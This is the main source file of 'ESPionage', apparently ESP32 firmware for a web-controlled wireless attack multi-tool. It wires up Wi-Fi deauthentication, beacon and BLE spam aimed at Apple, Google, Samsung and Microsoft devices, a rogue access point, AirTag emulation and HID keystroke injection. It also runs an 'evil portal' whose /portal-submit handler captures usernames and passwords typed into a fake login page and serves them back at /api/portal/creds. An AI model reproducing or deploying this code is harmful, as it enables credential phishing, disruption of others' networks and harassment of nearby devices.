// ESPionage - Self-contained multi-tool firmware with web UI
// Flash to any ESP32 DevKit, connect to the "ESPionage" WiFi network,
// and control everything from a browser at http://192.168.4.1

#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <Preferences.h>
#include "soc/rtc_cntl_reg.h"  // RTC_CNTL_OPTION1_REG — needed for reboot-to-bootloader

#include "config.h"
#include "web_files.h"
#include "wifi_tools.h"
#include "ble_tools.h"
#include "ble_hid.h"
#include "evil_portal.h"
#include "activity.h"
#if defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
#include "usb_tools.h"
#endif

AsyncWebServer server(80);
AsyncWebSocket ws("/ws");
Preferences prefs;

// Current mode — only one active at a time to prevent radio conflicts
enum Mode {
  MODE_IDLE             = 0,
  MODE_WIFI_SCAN        = 1,
  MODE_BLE_SCAN         = 2,
  MODE_BEACON_SPAM      = 3,
  MODE_APPLE_SPAM       = 4,
  MODE_GOOGLE_SPAM      = 5,
  MODE_SAMSUNG_SPAM     = 6,
  MODE_MICROSOFT_SPAM   = 7,
  MODE_PROBE_SNIFF      = 8,
  MODE_EVIL_PORTAL      = 9,
  MODE_WARDRIVE         = 10,
  MODE_AIRTAG_DETECT    = 11,
  MODE_WIFI_FINDER      = 12,
  MODE_BLE_FINDER       = 13,
  MODE_MIX_SPAM         = 14,
  MODE_CUSTOM_ADV       = 15,
  MODE_ROGUE_AP         = 16,
  MODE_DEAUTH           = 17,
  MODE_SSID_MESSAGE     = 18,
  MODE_AIRTAG_EMU       = 19,
};
Mode currentMode = MODE_IDLE;
unsigned long lastTick = 0;
String apSsid = AP_SSID_DEFAULT;
String apPass = AP_PASS_DEFAULT;

void startAP() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSsid.c_str(), apPass.c_str(), 1, 0, 8);
}

// ---------------------------------------------------------------- GPS cache
// Phone-supplied GPS (via browser geolocation POSTed to /api/gps).
struct GpsFix {
  bool valid = false;
  double lat = 0, lon = 0;
  float accuracy = 0, altitude = 0, speed = 0, heading = 0;
  uint32_t ts = 0;
};
GpsFix lastGps;

// ---------------------------------------------------------------- Broadcast
void broadcastStatus() {
  JsonDocument doc;
  doc["mode"] = (int)currentMode;
  doc["uptime"] = millis() / 1000;
  doc["heap"] = ESP.getFreeHeap();
  doc["clients"] = WiFi.softAPgetStationNum();
  doc["txp"] = WifiTools::currentTxPower();
  if (lastGps.valid) {
    JsonObject g = doc["gps"].to<JsonObject>();
    g["lat"] = lastGps.lat; g["lon"] = lastGps.lon;
    g["acc"] = lastGps.accuracy; g["alt"] = lastGps.altitude;
    g["age"] = (millis() - lastGps.ts) / 1000;
  }

  switch (currentMode) {
    case MODE_WIFI_SCAN:       WifiTools::fillStatus(doc); break;
    case MODE_BLE_SCAN:        BleTools::fillStatus(doc); break;
    case MODE_APPLE_SPAM:
    case MODE_GOOGLE_SPAM:
    case MODE_SAMSUNG_SPAM:
    case MODE_MICROSOFT_SPAM:
    case MODE_MIX_SPAM:        BleTools::fillSpamStatus(doc); break;
    case MODE_BEACON_SPAM:
    case MODE_SSID_MESSAGE:    WifiTools::fillBeaconStatus(doc); break;
    case MODE_PROBE_SNIFF:     WifiTools::fillProbeStatus(doc); break;
    case MODE_EVIL_PORTAL:     EvilPortal::fillStatus(doc); break;
    case MODE_WARDRIVE:        WifiTools::fillWardriveStatus(doc); break;
    case MODE_AIRTAG_DETECT:   BleTools::fillAirtagStatus(doc); break;
    case MODE_WIFI_FINDER:     WifiTools::fillFinderStatus(doc); break;
    case MODE_BLE_FINDER:      BleTools::fillFinderStatus(doc); break;
    case MODE_CUSTOM_ADV:      BleTools::fillCustomAdvStatus(doc); break;
    case MODE_ROGUE_AP:        WifiTools::fillRogueStatus(doc); break;
    case MODE_DEAUTH:          WifiTools::fillDeauthStatus(doc); break;
    case MODE_AIRTAG_EMU:      BleTools::fillAirtagEmulationStatus(doc); break;
    default: break;
  }

  String out;
  serializeJson(doc, out);
  ws.textAll(out);
}

void stopCurrentMode() {
  switch (currentMode) {
    case MODE_WIFI_SCAN:       WifiTools::stopScan(); break;
    case MODE_BLE_SCAN:        BleTools::stopScan(); break;
    case MODE_BEACON_SPAM:     WifiTools::stopBeaconSpam(); break;
    case MODE_APPLE_SPAM:
    case MODE_GOOGLE_SPAM:
    case MODE_SAMSUNG_SPAM:
    case MODE_MICROSOFT_SPAM:
    case MODE_MIX_SPAM:        BleTools::stopSpam(); break;
    case MODE_PROBE_SNIFF:     WifiTools::stopProbeSniff(); break;
    case MODE_EVIL_PORTAL:     EvilPortal::stop(); break;
    case MODE_WARDRIVE:        WifiTools::stopWardrive(); break;
    case MODE_AIRTAG_DETECT:   BleTools::stopAirtagDetect(); break;
    case MODE_WIFI_FINDER:     WifiTools::stopFinder(); break;
    case MODE_BLE_FINDER:      BleTools::stopFinder(); break;
    case MODE_CUSTOM_ADV:      BleTools::stopCustomAdv(); break;
    case MODE_ROGUE_AP:
      WifiTools::stopRogueAp();
      startAP(); // restore control AP
      break;
    case MODE_DEAUTH:          WifiTools::stopDeauth(); break;
    case MODE_SSID_MESSAGE:    WifiTools::stopSsidMessage(); break;
    case MODE_AIRTAG_EMU:      BleTools::stopAirtagEmulation(); break;
    default: break;
  }
  currentMode = MODE_IDLE;
}

void setMode(Mode m, const JsonDocument& params) {
  if (m == currentMode) return;
  stopCurrentMode();
  currentMode = m;
  switch (m) {
    case MODE_WIFI_SCAN:       WifiTools::startScan(); break;
    case MODE_BLE_SCAN:        BleTools::startScan(); break;
    case MODE_BEACON_SPAM:     WifiTools::startBeaconSpam(params); break;
    case MODE_APPLE_SPAM:      BleTools::startSpam(BleTools::SPAM_APPLE, params, params["appleIdx"] | -1); break;
    case MODE_GOOGLE_SPAM:     BleTools::startSpam(BleTools::SPAM_GOOGLE, params); break;
    case MODE_SAMSUNG_SPAM:    BleTools::startSpam(BleTools::SPAM_SAMSUNG, params); break;
    case MODE_MICROSOFT_SPAM:  BleTools::startSpam(BleTools::SPAM_MICROSOFT, params); break;
    case MODE_MIX_SPAM:        BleTools::startSpam(BleTools::SPAM_MIX, params); break;
    case MODE_PROBE_SNIFF:     WifiTools::startProbeSniff(); break;
    case MODE_EVIL_PORTAL:     EvilPortal::start(params); break;
    case MODE_WARDRIVE:        WifiTools::startWardrive(); break;
    case MODE_AIRTAG_DETECT:   BleTools::startAirtagDetect(); break;
    case MODE_WIFI_FINDER:     WifiTools::startFinder(params); break;
    case MODE_BLE_FINDER:      BleTools::startFinder(params); break;
    case MODE_CUSTOM_ADV:      BleTools::startCustomAdv(params); break;
    case MODE_ROGUE_AP:        WifiTools::startRogueAp(params); break;
    case MODE_DEAUTH:          WifiTools::startDeauth(params); break;
    case MODE_SSID_MESSAGE:    WifiTools::startSsidMessage(params); break;
    case MODE_AIRTAG_EMU:      BleTools::startAirtagEmulation(params); break;
    default: break;
  }
}

// ---------------------------------------------------------------- Web routes
void setupRoutes() {
  // Static files from PROGMEM
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send_P(200, "text/html", INDEX_HTML);
  });
  server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send_P(200, "text/css", STYLE_CSS);
  });
  server.on("/app.js", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send_P(200, "application/javascript", APP_JS);
  });

  // ---- Info
  server.on("/api/info", HTTP_GET, [](AsyncWebServerRequest *req) {
    JsonDocument doc;
    doc["chip"] = ESP.getChipModel();
    doc["cores"] = ESP.getChipCores();
    doc["freq"] = ESP.getCpuFreqMHz();
    doc["flash"] = ESP.getFlashChipSize();
    doc["heap"] = ESP.getFreeHeap();
    doc["mac"] = WiFi.macAddress();
    doc["firmware"] = FIRMWARE_VERSION;
    doc["apSsid"] = apSsid;
    doc["txp"] = WifiTools::currentTxPower();
    // USB capability: ESP32-S2 and S3 have native USB OTG; classic ESP32 does not.
    String chipModel = String(ESP.getChipModel());
    bool usbCap = chipModel.indexOf("S2") >= 0 || chipModel.indexOf("S3") >= 0;
    doc["usbCapable"] = usbCap;
    // USB host detection: use TinyUSB mount status (reliable on S3 with USBMode=default).
    bool usbHost = false;
#if defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
    usbHost = UsbTools::isMounted();
#endif
    doc["usbHostConnected"] = usbHost;
#if defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
    doc["usbActive"]   = UsbTools::isActive();
#else
    doc["usbActive"]   = false;
#endif
    String out; serializeJson(doc, out);
    req->send(200, "application/json", out);
  });

  server.on("/api/mode", HTTP_GET, [](AsyncWebServerRequest *req) {
    JsonDocument doc;
    doc["mode"] = (int)currentMode;
    String out; serializeJson(doc, out);
    req->send(200, "application/json", out);
  });

  // Combined poll endpoint — returns mode + bleHid + usb in one request.
  // The JS page-load init and recurring poll both use this to avoid
  // firing 5+ simultaneous requests that exhaust the AsyncTCP connection pool.
  server.on("/api/poll", HTTP_GET, [](AsyncWebServerRequest *req) {
    String bleHid = BleHid::getStatusJson();
#if defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
    String usb = UsbTools::getStatusJson();
#else
    String usb = "{\"mounted\":false,\"jiggling\":false,\"hidRunning\":false}";
#endif
    String out = "{\"mode\":" + String((int)currentMode) +
                 ",\"bleHid\":" + bleHid +
                 ",\"usb\":" + usb +
                 "}";
    req->send(200, "application/json", out);
  });

  server.on("/api/mode", HTTP_POST,
    [](AsyncWebServerRequest *req){},
    NULL,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t index, size_t total) {
      JsonDocument doc;
      DeserializationError err = deserializeJson(doc, data, len);
      if (err) { req->send(400, "text/plain", "bad json"); return; }
      int m = doc["mode"] | 0;
      setMode((Mode)m, doc);
      req->send(200, "application/json", "{\"ok\":true}");
    });

  // Results / logs
  server.on("/api/wifi", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send(200, "application/json", WifiTools::scanResultsJson());
  });
  server.on("/api/ble", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send(200, "application/json", BleTools::scanResultsJson());
  });
  server.on("/api/apple-devices", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send(200, "application/json", BleTools::appleDeviceListJson());
  });
  server.on("/api/portal/creds", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send(200, "application/json", EvilPortal::credsJson());
  });
  server.on("/api/probes", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send(200, "application/json", WifiTools::probesJson());
  });
  server.on("/api/wardrive/csv", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send(200, "text/csv", WifiTools::wardriveCsv());
  });
  server.on("/api/activity", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send(200, "application/json", Activity::json());
  });

  server.on("/api/logs/clear", HTTP_POST, [](AsyncWebServerRequest *req) {
    WifiTools::clearLogs();
    EvilPortal::clearCreds();
    BleTools::clearLogs();
    Activity::clear();
    req->send(200, "application/json", "{\"ok\":true}");
  });

  // ---- Config (AP SSID/pass, TX power, MAC randomize)
  server.on("/api/config", HTTP_POST,
    [](AsyncWebServerRequest *req){},
    NULL,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t index, size_t total) {
      JsonDocument doc;
      if (deserializeJson(doc, data, len)) { req->send(400, "text/plain", "bad json"); return; }

      bool apChanged = false;
      if (doc["apSsid"].is<const char*>()) {
        String s = doc["apSsid"].as<String>();
        if (s.length() >= 1 && s.length() <= 32) { apSsid = s; prefs.putString("ap_ssid", apSsid); apChanged = true; }
      }
      if (doc["apPass"].is<const char*>()) {
        String p = doc["apPass"].as<String>();
        if (p.length() == 0 || (p.length() >= 8 && p.length() <= 63)) { apPass = p; prefs.putString("ap_pass", apPass); apChanged = true; }
      }
      if (doc["txp"].is<int>()) WifiTools::setTxPower(doc["txp"].as<int>());
      if (doc["randomizeMac"] | false) WifiTools::randomizeMac();

      if (apChanged) {
        Activity::log("info", "AP credentials updated — rebooting in 2s");
        req->send(200, "application/json", "{\"ok\":true,\"reboot\":true}");
        delay(2000); ESP.restart();
        return;
      }
      req->send(200, "application/json", "{\"ok\":true}");
    });

  // Finder calibration / environment
  server.on("/api/finder/calibrate", HTTP_POST, [](AsyncWebServerRequest *req) {
    if (currentMode == MODE_WIFI_FINDER) WifiTools::finderCalibrate();
    else if (currentMode == MODE_BLE_FINDER) BleTools::finderCalibrate();
    req->send(200, "application/json", "{\"ok\":true}");
  });
  server.on("/api/finder/env", HTTP_POST,
    [](AsyncWebServerRequest *req){},
    NULL,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t index, size_t total) {
      JsonDocument doc;
      if (deserializeJson(doc, data, len)) { req->send(400, "text/plain", "bad"); return; }
      float n = doc["n"] | 3.0f;
      if (currentMode == MODE_WIFI_FINDER) WifiTools::finderSetEnv(n);
      else if (currentMode == MODE_BLE_FINDER) BleTools::finderSetEnv(n);
      req->send(200, "application/json", "{\"ok\":true}");
    });

  server.on("/api/reboot", HTTP_POST, [](AsyncWebServerRequest *req) {
    req->send(200, "application/json", "{\"ok\":true}");
    delay(200); ESP.restart();
  });

  // Reboot into ROM USB download mode so esptool can flash without physical buttons.
  // Only useful when USBMode=default (HID mode) where the port disappears after boot.
  server.on("/api/reboot-bootloader", HTTP_POST, [](AsyncWebServerRequest *req) {
    req->send(200, "application/json", "{\"ok\":true,\"note\":\"Rebooting into USB download mode\"}");
    delay(200);
#if defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
    // Set the ESP32-S3 force-download-boot bit in RTC control register
    REG_SET_BIT(RTC_CNTL_OPTION1_REG, RTC_CNTL_FORCE_DOWNLOAD_BOOT_M);
#endif
    esp_restart();
  });

  // USB HID / mouse jiggler actions (ESP32-S3 with USBMode=default only)
  server.on("/api/usb", HTTP_POST,
    [](AsyncWebServerRequest *req){},
    NULL,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t index, size_t total) {
      JsonDocument doc;
      if (deserializeJson(doc, data, len)) { req->send(400, "text/plain", "bad"); return; }
#if defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
      const char* type    = doc["type"]    | "stop";
      const char* payload = doc["payload"] | "";
      const char* os      = doc["os"]      | "windows";
      const char* vid     = doc["vid"]     | "";
      const char* pid     = doc["pid"]     | "";
      int  interval       = doc["interval"] | 30;
      bool looping        = doc["loop"]     | false;

      // Only hid / mouse / stop are actually wired up. Everything else gets a
      // clear not-implemented note so the UI doesn't show a fake success.
      bool supported = (!strcmp(type, "hid") || !strcmp(type, "mouse") || !strcmp(type, "stop"));
      if (supported) {
        UsbTools::handleAction(type, payload, interval, looping, os, vid, pid);
        Activity::log("info", String("USB ") + type + " (" + os + ")");
        req->send(200, "application/json", "{\"ok\":true}");
      } else {
        String note = String("Not yet implemented: ") + type;
        Activity::log("warn", String("USB ") + type + " requested but not implemented");
        req->send(200, "application/json", String("{\"ok\":false,\"note\":\"") + note + "\"}");
      }
#else
      req->send(200, "application/json", "{\"ok\":false,\"note\":\"Requires ESP32-S3\"}");
#endif
    });

  // USB status poll — lets the UI toggle jiggler button text, etc.
  server.on("/api/usb-status", HTTP_GET, [](AsyncWebServerRequest *req) {
#if defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
    req->send(200, "application/json", UsbTools::getStatusJson());
#else
    req->send(200, "application/json", "{\"mounted\":false,\"jiggling\":false,\"hidRunning\":false}");
#endif
  });

  // BLE HID — act as wireless keyboard/mouse to a paired phone or laptop
  server.on("/api/ble-hid", HTTP_POST,
    [](AsyncWebServerRequest *req){},
    NULL,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t index, size_t total) {
      JsonDocument doc;
      if (deserializeJson(doc, data, len)) { req->send(400, "text/plain", "bad json"); return; }
      const char* type    = doc["type"]    | "stop";
      const char* payload = doc["payload"] | "";
      const char* name    = doc["name"]    | "ESPionage KB";
      int         interval= doc["interval"] | 30;
      bool        looping = doc["loop"]    | false;
      BleHid::handleAction(type, payload, interval, looping, name);
      req->send(200, "application/json", "{\"ok\":true}");
    });

  server.on("/api/ble-hid-status", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send(200, "application/json", BleHid::getStatusJson());
  });

  // Phone GPS push — browser watchPosition posts here every few seconds
  server.on("/api/gps", HTTP_POST,
    [](AsyncWebServerRequest *req){},
    NULL,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t index, size_t total) {
      JsonDocument doc;
      if (deserializeJson(doc, data, len)) { req->send(400, "text/plain", "bad"); return; }
      lastGps.valid    = true;
      lastGps.lat      = doc["lat"] | 0.0;
      lastGps.lon      = doc["lon"] | 0.0;
      lastGps.accuracy = doc["acc"] | 0.0f;
      lastGps.altitude = doc["alt"] | 0.0f;
      lastGps.speed    = doc["spd"] | 0.0f;
      lastGps.heading  = doc["hdg"] | 0.0f;
      lastGps.ts       = millis();
      WifiTools::setGps(lastGps.lat, lastGps.lon, lastGps.accuracy);
      req->send(200, "application/json", "{\"ok\":true}");
    });

  // ---- Evil portal
  server.on("/portal-login", HTTP_GET, [](AsyncWebServerRequest *req) {
    req->send_P(200, "text/html", EvilPortal::loginPageProgmem());
  });
  server.on("/portal-submit", HTTP_POST,
    [](AsyncWebServerRequest *req) {
      String user = req->hasParam("username", true) ? req->getParam("username", true)->value() : "";
      String pass = req->hasParam("password", true) ? req->getParam("password", true)->value() : "";
      String tmpl = req->hasParam("t",        true) ? req->getParam("t",        true)->value() : "unknown";
      EvilPortal::captureCredential(user, pass, tmpl);
      Activity::log("capture", "Cred captured via " + tmpl + ": " + user);
      req->send_P(200, "text/html", PORTAL_SUCCESS);
    });

  server.onNotFound([](AsyncWebServerRequest *req) {
    if (EvilPortal::isActive()) req->redirect("/portal-login");
    else req->redirect("/");
  });
}

void onWsEvent(AsyncWebSocket *s, AsyncWebSocketClient *c,
               AwsEventType type, void *arg, uint8_t *data, size_t len) {
  if (type == WS_EVT_CONNECT) broadcastStatus();
}

void setup() {
  Serial.begin(115200);
  Serial.println("\n=== ESPionage v" FIRMWARE_VERSION " starting ===");

  prefs.begin("espionage", false);
  apSsid = prefs.getString("ap_ssid", AP_SSID_DEFAULT);
  apPass = prefs.getString("ap_pass", AP_PASS_DEFAULT);

  startAP();
  Serial.printf("AP up: %s  (pass: %s)\n", apSsid.c_str(), apPass.c_str());
  Serial.print("IP:  "); Serial.println(WiFi.softAPIP());

  Activity::init();
  WifiTools::init();
  BleTools::init();
  EvilPortal::init();
#if defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
  UsbTools::begin();
#endif

  Activity::log("info", "ESPionage booted");

  setupRoutes();
  ws.onEvent(onWsEvent);
  server.addHandler(&ws);
  server.begin();
  Serial.println("Web server running on :80");
}

void loop() {
  switch (currentMode) {
    case MODE_WIFI_SCAN:       WifiTools::tickScan(); break;
    case MODE_BLE_SCAN:        BleTools::tickScan(); break;
    case MODE_BEACON_SPAM:
    case MODE_SSID_MESSAGE:    WifiTools::tickBeaconSpam(); break;
    case MODE_APPLE_SPAM:
    case MODE_GOOGLE_SPAM:
    case MODE_SAMSUNG_SPAM:
    case MODE_MICROSOFT_SPAM:
    case MODE_MIX_SPAM:        BleTools::tickSpam(); break;
    case MODE_PROBE_SNIFF:     WifiTools::tickProbeSniff(); break;
    case MODE_EVIL_PORTAL:     EvilPortal::tick(); break;
    case MODE_WARDRIVE:        WifiTools::tickWardrive(); break;
    case MODE_AIRTAG_DETECT:   BleTools::tickAirtagDetect(); break;
    case MODE_WIFI_FINDER:     WifiTools::tickFinder(); break;
    case MODE_BLE_FINDER:      BleTools::tickFinder(); break;
    case MODE_DEAUTH:          WifiTools::tickDeauth(); break;
    case MODE_AIRTAG_EMU:      BleTools::tickAirtagEmulation(); break;
    default: break;
  }

  if (millis() - lastTick > 500) {
    lastTick = millis();
    broadcastStatus();
    ws.cleanupClients();
  }
}
